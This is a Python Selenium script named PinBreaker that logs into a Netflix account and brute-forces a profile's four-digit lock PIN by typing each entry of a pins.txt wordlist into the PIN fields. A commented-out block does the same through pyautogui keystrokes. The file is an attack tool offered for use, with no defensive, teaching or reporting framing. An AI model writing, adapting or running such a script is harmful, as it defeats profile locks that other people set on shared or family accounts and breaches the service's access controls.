from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
import pyautogui
import time


# with open("pins.txt", "r") as f:
#     time.sleep(2)
#     for pin in f.readlines():
#         digits = list(pin)
#         digits.pop()
#         pyautogui.typewrite(digits[0])
#         pyautogui.typewrite(digits[1])
#         pyautogui.typewrite(digits[2])
#         pyautogui.typewrite(digits[3])

options = Options()
options.binary_location = "C://Program Files/Google/Chrome/Application/chrome.exe"
        

class PinBreaker:
    def __init__(self, username, password):
        self.browser = webdriver.Chrome(options=options)
        self.username = username
        self.password = password

    def login(self):
        self.browser.get("https://www.netflix.com/tr-en/login")
        time.sleep(1)

        self.browser.find_element(by=By.XPATH, value='//*[@id="id_userLoginId"]').send_keys(self.username)
        self.browser.find_element(by=By.XPATH, value='//*[@id="id_password"]').send_keys(self.password)
        self.browser.find_element(by=By.XPATH, value='//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/form/button').click()
        time.sleep(2)

    def brute(self):
        self.browser.find_element(by=By.XPATH, value='//*[@id="appMountPoint"]/div/div/div[1]/div[1]/div[2]/div/div/ul/li[1]/div/a/div/div[1]').click()
        time.sleep(2)

        try:
            with open("pins.txt", "r") as f:
                for pin in f.readlines():
                    digits = list(pin)
                    digits.pop()

                    self.browser.find_element(by=By.XPATH, value='//*[@id="appMountPoint"]/div/div/div[1]/div[1]/div[2]/div/div[3]/div/input[1]').send_keys(digits[0])
                    self.browser.find_element(by=By.XPATH, value='//*[@id="appMountPoint"]/div/div/div[1]/div[1]/div[2]/div/div[3]/div/input[2]').send_keys(digits[1])
                    self.browser.find_element(by=By.XPATH, value='//*[@id="appMountPoint"]/div/div/div[1]/div[1]/div[2]/div/div[3]/div/input[3]').send_keys(digits[2])
                    self.browser.find_element(by=By.XPATH, value='//*[@id="appMountPoint"]/div/div/div[1]/div[1]/div[2]/div/div[3]/div/input[4]').send_keys(digits[3])
        except Exception as e:
            print(e)


pin_breaker = PinBreaker("test@gmail.com", "test")
pin_breaker.login()
pin_breaker.brute()
